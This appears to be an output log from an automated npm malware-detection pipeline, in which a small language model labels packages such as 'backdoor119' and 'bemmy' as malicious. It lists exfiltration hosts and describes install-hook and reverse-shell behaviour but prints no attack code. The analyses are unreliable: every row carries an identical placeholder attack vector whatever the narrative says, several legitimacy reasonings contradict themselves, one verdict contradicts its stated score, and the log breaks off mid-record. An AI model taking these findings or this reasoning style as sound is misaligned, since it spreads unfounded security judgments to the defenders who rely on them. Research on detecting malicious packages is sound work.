    ""reasoning"": ""The package 'azure-linux-tools' has a high level of malicious intent based on the evidence of network requests to a specified hostname.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'azure-linux-tools' sends network requests to a specified hostname 'en3200xn6mbcvbo.m.pipedream.net' in the index.js file at line 25. This could indicate data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'azure-linux-tools' has a high level of malicious intent based on the evidence of network requests to a specified hostname.""}}"
azure-rest-api-specs-tests,1.0.0,malicious,2026-03-27T13:09:11.253279,flag,1.0,MALICIOUS,0.79,0.79,The package 'azure-rest-api-specs-tests' sends network requests to an unknown server identified by the hostname 'cfptb3c2vtc0000sqvmgg85tpmryyyyyd.oast.fun' in the index.js file at line 26 and 5. This could indicate data exfiltration.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, and the suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'azure-rest-api-specs-tests' sends network requests to an unknown server identified by the hostname 'cfptb3c2vtc0000sqvmgg85tpmryyyyyd.oast.fun' in the index.js file at line 26 and 5. This could indicate data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and the suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'azure-rest-api-specs-tests' sends network requests to an unknown server identified by the hostname 'cfptb3c2vtc0000sqvmgg85tpmryyyyyd.oast.fun' in the index.js file at line 26 and 5. This could indicate data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and the suspicious behavior is unjustified.""}}"
azure-sp,3.0.0,malicious,2026-03-27T13:09:19.348907,flag,1.0,MALICIOUS,0.74,0.74,The package 'azure-sp' sends network requests to an external IP address (54.188.234.198) in the index.js file at line 4 and 7. This could indicate a network exfiltration attack.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'azure-sp' does not have a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'azure-sp' sends network requests to an external IP address (54.188.234.198) in the index.js file at line 4 and 7. This could indicate a network exfiltration attack."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.74,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.74
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'azure-sp' does not have a description or README file, indicating its legitimacy.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'azure-sp' sends network requests to an external IP address (54.188.234.198) in the index.js file at line 4 and 7. This could indicate a network exfiltration attack."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.74, ""verdict"": ""MALICIOUS"", ""confidence"": 0.74}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'azure-sp' does not have a description or README file, indicating its legitimacy.""}}"
backdoor119,10.0.0,malicious,2026-03-27T13:09:26.173075,flag,0.9973,MALICIOUS,0.86,0.7,The package 'backdoor119' version 10.0.0 sends data to an unknown domain over HTTPS in the pre-install hook of the package.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package 'backdoor119' does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'backdoor119' version 10.0.0 sends data to an unknown domain over HTTPS in the pre-install hook of the package."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.86
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'backdoor119' does not have a description or README file.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'backdoor119' version 10.0.0 sends data to an unknown domain over HTTPS in the pre-install hook of the package."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.86}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'backdoor119' does not have a description or README file.""}}"
bazel-out,999.9.9,malicious,2026-03-27T13:09:35.256388,flag,0.7373,MALICIOUS,0.79,0.74,"The package 'bazel-out' is making a network request to 'bugbounty.click' with a GET request method and includes the username, hostname, packagename, and current working directory in the request path. This behavior could potentially be part of a data exfiltration attack.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'bazel-out' does not have a description or README file, indicating that it could be a legitimate package used for legitimate purposes.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bazel-out' is making a network request to 'bugbounty.click' with a GET request method and includes the username, hostname, packagename, and current working directory in the request path. This behavior could potentially be part of a data exfiltration attack."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.74,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'bazel-out' does not have a description or README file, indicating that it could be a legitimate package used for legitimate purposes.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'bazel-out' is making a network request to 'bugbounty.click' with a GET request method and includes the username, hostname, packagename, and current working directory in the request path. This behavior could potentially be part of a data exfiltration attack."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.74, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'bazel-out' does not have a description or README file, indicating that it could be a legitimate package used for legitimate purposes.""}}"
bebekair,1.7.0,malicious,2026-03-27T13:09:43.412711,flag,1.0,MALICIOUS,0.85,0.7,The malware package 'bebekair' sends network data to remote servers using DNS resolution. The data is sent in chunks of 60 characters and the chunks are resolved as A records. The server IPs are hardcoded in the function. The malware package is likely conducting a network exfiltration attack.,"[""dns.resolve"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'bebekair' does not have a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malware package 'bebekair' sends network data to remote servers using DNS resolution. The data is sent in chunks of 60 characters and the chunks are resolved as A records. The server IPs are hardcoded in the function. The malware package is likely conducting a network exfiltration attack."",
    ""attack_vector"": [""dns.resolve"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.85
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'bebekair' does not have a description or README file, indicating its legitimacy.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The malware package 'bebekair' sends network data to remote servers using DNS resolution. The data is sent in chunks of 60 characters and the chunks are resolved as A records. The server IPs are hardcoded in the function. The malware package is likely conducting a network exfiltration attack."", ""attack_vector"": [""dns.resolve"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.85}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'bebekair' does not have a description or README file, indicating its legitimacy.""}}"
bem-mvc-direct,1.11.3,malicious,2026-03-27T13:09:53.333348,review,0.336,MALICIOUS,0.72,0.7,The package 'bem-mvc-direct' version 1.11.3 contains an install hook present at install time that executes commands listed in the package metadata. The commands are curl commands with specific headers and a payload. The package may be used for remote code execution.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bem-mvc-direct' version 1.11.3 contains an install hook present at install time that executes commands listed in the package metadata. The commands are curl commands with specific headers and a payload. The package may be used for remote code execution."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_analysis' section provides a narrative of the attack chain, the attack vector used, the chain score, the verdict (MALICIOUS, SUSPICIOUS, or BENIGN), and the confidence level. The 'legitimacy_check' section provides information about whether the detected behaviors justify the verdict and the reasoning behind it.","{""chain_analysis"": {""chain_narrative"": ""The package 'bem-mvc-direct' version 1.11.3 contains an install hook present at install time that executes commands listed in the package metadata. The commands are curl commands with specific headers and a payload. The package may be used for remote code execution."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
bem-mvc-direct,1.11.4,malicious,2026-03-27T13:10:03.424951,review,0.336,MALICIOUS,0.72,0.7,The package 'bem-mvc-direct' version 1.11.4 contains an install hook that may execute remote code at install time. The install hook sends a 'meow!securitytest' payload to a remote server.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bem-mvc-direct' version 1.11.4 contains an install hook that may execute remote code at install time. The install hook sends a 'meow!securitytest' payload to a remote server."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_analysis' section provides a narrative of the attack chain, the attack vector used, the chain score, the verdict (MALICIOUS, SUSPICIOUS, or BENIGN), and the confidence level of the detected behaviors. The 'legitimacy_check' section provides information about whether the detected behaviors justify the verdict and a reasoning for the verdict.","{""chain_analysis"": {""chain_narrative"": ""The package 'bem-mvc-direct' version 1.11.4 contains an install hook that may execute remote code at install time. The install hook sends a 'meow!securitytest' payload to a remote server."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
bemhint-plugins,0.5.12,malicious,2026-03-27T13:10:15.990313,review,0.336,MALICIOUS,0.72,0.7,The package 'bemhint-plugins' version '0.5.12' contains no JavaScript files but an install hook present at install time. The commands listed in the package metadata indicate a potential payload that may execute at install time.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bemhint-plugins' version '0.5.12' contains no JavaScript files but an install hook present at install time. The commands listed in the package metadata indicate a potential payload that may execute at install time."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

This JSON object represents the analysis of the package 'bemhint-plugins' version '0.5.12'. The behavior identified is 'install_hook', which suggests that the package contains no JavaScript files but an install hook present at install time. The commands listed in the package metadata indicate a potential payload that may execute at install time. The signals suggest a hook-based attack payload. The Risk vector is 'install_hook'. The attack chain reconstruction is as follows: The package is installed, the install hook is executed, potentially executing a reverse shell payload. The chain score is 0.7, indicating a high level of maliciousness. The verdict is 'MALICIOUS', indicating that the package is malicious. The legitimacy check indicates that the package does not have a description or README file, which could justify the malicious behavior.""","{""chain_analysis"": {""chain_narrative"": ""The package 'bemhint-plugins' version '0.5.12' contains no JavaScript files but an install hook present at install time. The commands listed in the package metadata indicate a potential payload that may execute at install time."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
bemhint.i18n,0.2.6,malicious,2026-03-27T13:10:27.177428,review,0.336,MALICIOUS,0.72,0.7,The package contains no JavaScript files and may contain a post-installation hook with a payload that may be a remote reverse shell. The payload is executed when the package is installed.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package contains no JavaScript files, which is not a common practice in software development. The post-installation hook with a payload that may be a remote reverse shell is not justified by the p",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains no JavaScript files and may contain a post-installation hook with a payload that may be a remote reverse shell. The payload is executed when the package is installed."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package contains no JavaScript files, which is not a common practice in software development. The post-installation hook with a payload that may be a remote reverse shell is not justified by the package's structure or content.""
  }
}
```

This JSON object provides a comprehensive analysis of the attack chain based on the detected behaviors. The attack chain narrative summarizes the full attack using real package name and real IOCs. The attack vector includes key technical indicators such as real IPs, domains, commands, and API calls. The chain score is based on the confidence of the detected behaviors and can be used to classify the package as MALICIOUS, SUSPICIOUS, or BENIGN. The legitimacy check provides a secondary boolean output that indicates whether the detected behaviors justify the package's verdict.","{""chain_analysis"": {""chain_narrative"": ""The package contains no JavaScript files and may contain a post-installation hook with a payload that may be a remote reverse shell. The payload is executed when the package is installed."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package contains no JavaScript files, which is not a common practice in software development. The post-installation hook with a payload that may be a remote reverse shell is not justified by the package's structure or content.""}}"
bemmy,137.0.0,malicious,2026-03-27T13:10:34.966717,flag,1.0,MALICIOUS,0.7,0.7,The attacker likely used the 'bemmy' package to propagate supply chain attacks. The attacker used the 'convertASCIItoHex' function to convert the string 'ebala' to hexadecimal. The hexadecimal string was then used to execute a reverse shell command on a remote server.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The 'bemmy' package does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker likely used the 'bemmy' package to propagate supply chain attacks. The attacker used the 'convertASCIItoHex' function to convert the string 'ebala' to hexadecimal. The hexadecimal string was then used to execute a reverse shell command on a remote server."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.7
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The 'bemmy' package does not have a description or README file, indicating that it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The attacker likely used the 'bemmy' package to propagate supply chain attacks. The attacker used the 'convertASCIItoHex' function to convert the string 'ebala' to hexadecimal. The hexadecimal string was then used to execute a reverse shell command on a remote server."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.7}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The 'bemmy' package does not have a description or README file, indicating that it may be malicious.""}}"
bemmy-slider,141.0.0,malicious,2026-03-27T13:10:42.976178,flag,0.84,MALICIOUS,0.9,0.84,"The package 'bemmy-slider' sends a POST request to an unknown host with sensitive data in the request body. The sensitive data is obtained from the process environment variables. The request is sent in base64 encoded format. The malicious intent seems to be supply chain propagation, as the code is s","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'bemmy-slider' does not have a description or README file, indicating that it may be legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bemmy-slider' sends a POST request to an unknown host with sensitive data in the request body. The sensitive data is obtained from the process environment variables. The request is sent in base64 encoded format. The malicious intent seems to be supply chain propagation, as the code is sending this data to an unknown host."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.84,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.90
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'bemmy-slider' does not have a description or README file, indicating that it may be legitimate.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'bemmy-slider' sends a POST request to an unknown host with sensitive data in the request body. The sensitive data is obtained from the process environment variables. The request is sent in base64 encoded format. The malicious intent seems to be supply chain propagation, as the code is sending this data to an unknown host."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.84, ""verdict"": ""MALICIOUS"", ""confidence"": 0.9}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'bemmy-slider' does not have a description or README file, indicating that it may be legitimate.""}}"
bi3g0-npm-test,1.0.1,malicious,2026-03-27T13:10:50.998418,flag,1.0,MALICIOUS,0.79,0.79,The package 'bi3g0-npm-test' sends network requests to a specified hostname 'eucturjgaxgeyaaowd534x5a117svh.burpcollaborator.net' for data exfiltration. The hostname is used in the index.js file at line 26 and 5.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, and the behavior is not justified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bi3g0-npm-test' sends network requests to a specified hostname 'eucturjgaxgeyaaowd534x5a117svh.burpcollaborator.net' for data exfiltration. The hostname is used in the index.js file at line 26 and 5."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and the behavior is not justified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'bi3g0-npm-test' sends network requests to a specified hostname 'eucturjgaxgeyaaowd534x5a117svh.burpcollaborator.net' for data exfiltration. The hostname is used in the index.js file at line 26 and 5."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and the behavior is not justified.""}}"
big-design,2.0.0,malicious,2026-03-27T13:10:58.474093,flag,1.0,MALICIOUS,0.79,0.79,The attacker sends network requests to a specified hostname 'cd5wt1g2vtc00000aj7ggg16pyayyyyyb.oast.fun' using POST method and 'application/x-www-form-urlencoded' content type. The hostname is suspected to be a potential data exfiltration behavior.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker sends network requests to a specified hostname 'cd5wt1g2vtc00000aj7ggg16pyayyyyyb.oast.fun' using POST method and 'application/x-www-form-urlencoded' content type. The hostname is suspected to be a potential data exfiltration behavior."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The attacker sends network requests to a specified hostname 'cd5wt1g2vtc00000aj7ggg16pyayyyyyb.oast.fun' using POST method and 'application/x-www-form-urlencoded' content type. The hostname is suspected to be a potential data exfiltration behavior."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
binary-bot,5.3.2,malicious,2026-03-27T13:11:05.997111,review,0.494,MALICIOUS,0.71,0.7,The attacker sends a network request to a specified host using HTTPS POST method. The request is sent to the domain 'binary-bot-ccmwya12vtc0000f7ne0ggkqxfryyyyyb.mybeautifuliframe.com'. The attacker's IP address is not provided in the evidence.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The behavior is not clearly supported by evidence.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker sends a network request to a specified host using HTTPS POST method. The request is sent to the domain 'binary-bot-ccmwya12vtc0000f7ne0ggkqxfryyyyyb.mybeautifuliframe.com'. The attacker's IP address is not provided in the evidence."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.71
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The behavior is not clearly supported by evidence.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The attacker sends a network request to a specified host using HTTPS POST method. The request is sent to the domain 'binary-bot-ccmwya12vtc0000f7ne0ggkqxfryyyyyb.mybeautifuliframe.com'. The attacker's IP address is not provided in the evidence."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.71}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The behavior is not clearly supported by evidence.""}}"
bitbank-api-docs,1.0.0,malicious,2026-03-27T13:11:14.518244,flag,1.0,MALICIOUS,0.79,0.79,"The package 'bitbank-api-docs' sends network requests to a collaborator server, potentially for data exfiltration. The requests are sent as POST requests with tracking data as the message body. The tracking data includes package name, current directory, home directory, host name, user name, and DNS ","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'bitbank-api-docs' does not have a description or README file, indicating it may be legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bitbank-api-docs' sends network requests to a collaborator server, potentially for data exfiltration. The requests are sent as POST requests with tracking data as the message body. The tracking data includes package name, current directory, home directory, host name, user name, and DNS server. The confidence score of 0.79 indicates a high level of confidence in the detection of this malicious intent."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'bitbank-api-docs' does not have a description or README file, indicating it may be legitimate.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'bitbank-api-docs' sends network requests to a collaborator server, potentially for data exfiltration. The requests are sent as POST requests with tracking data as the message body. The tracking data includes package name, current directory, home directory, host name, user name, and DNS server. The confidence score of 0.79 indicates a high level of confidence in the detection of this malicious intent."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'bitbank-api-docs' does not have a description or README file, indicating it may be legitimate.""}}"
bitmovin-internal,0.0.2,malicious,2026-03-27T13:11:21.960074,flag,1.0,MALICIOUS,0.79,0.79,"The package 'bitmovin-internal' sends network requests to a known webhook/exfiltration collector domain, potentially indicating a data exfiltration intent.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'bitmovin-internal' is likely involved in data exfiltration, but the evidence provided does not justify its malicious intent.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bitmovin-internal' sends network requests to a known webhook/exfiltration collector domain, potentially indicating a data exfiltration intent."",
    ""attack_vector"": [
      ""postinstallhook"",
      ""bash-c"",
      ""34.x.x.x:4444"",
      ""reverseshell""
    ],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'bitmovin-internal' is likely involved in data exfiltration, but the evidence provided does not justify its malicious intent.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'bitmovin-internal' sends network requests to a known webhook/exfiltration collector domain, potentially indicating a data exfiltration intent."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'bitmovin-internal' is likely involved in data exfiltration, but the evidence provided does not justify its malicious intent.""}}"
bitshares-ui-style-guide,1.0.1,malicious,2026-03-27T13:11:34.926864,flag,1.0,SUSPICIOUS,0.79,0.7,The package 'bitshares-ui-style-guide' version 1.0.1 is suspected of sending network requests to a known exfiltration domain 'eon4ohhg8790gtf.m.pipedream.net' during the installation process. The package sends network requests to the hostname in the index.js file.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'bitshares-ui-style-guide' does not have a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bitshares-ui-style-guide' version 1.0.1 is suspected of sending network requests to a known exfiltration domain 'eon4ohhg8790gtf.m.pipedream.net' during the installation process. The package sends network requests to the hostname in the index.js file."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""SUSPICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'bitshares-ui-style-guide' does not have a description or README file, indicating its legitimacy.""
  }
}
```

This JSON object provides a comprehensive analysis of the attack chain. The chain narrative summarizes the full attack using the real package name and real IOCs. The attack vector includes the key technical indicators, real IPs, domains, commands, and API calls. The chain score is based on the confidence score of the detected behaviors. The verdict is based on the chain score, with a chain score of 0.4 or above being considered malicious, 0.4 to 0.69 being suspicious, and below 0.4 being benign. The legitimacy check indicates that the package does not have a description or README file, indicating its legitimacy.","{""chain_analysis"": {""chain_narrative"": ""The package 'bitshares-ui-style-guide' version 1.0.1 is suspected of sending network requests to a known exfiltration domain 'eon4ohhg8790gtf.m.pipedream.net' during the installation process. The package sends network requests to the hostname in the index.js file."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""SUSPICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'bitshares-ui-style-guide' does not have a description or README file, indicating its legitimacy.""}}"
bjabaiheiiyuuui,5.0.0,malicious,2026-03-27T13:11:43.658054,flag,1.0,MALICIOUS,0.79,0.79,"The package 'bjabaiheiiyuuui' sends network requests to a specified hostname 'ccjjr4r2vtc0000ta0ggggjk9uayyyyyr.oast.fun' in the index.js file at line 25 and 4. The attack vector includes the 'postinstallhook', 'bash-c', '34.x.x.x:4444', and 'reverseshell'.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package has no description or README and the suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
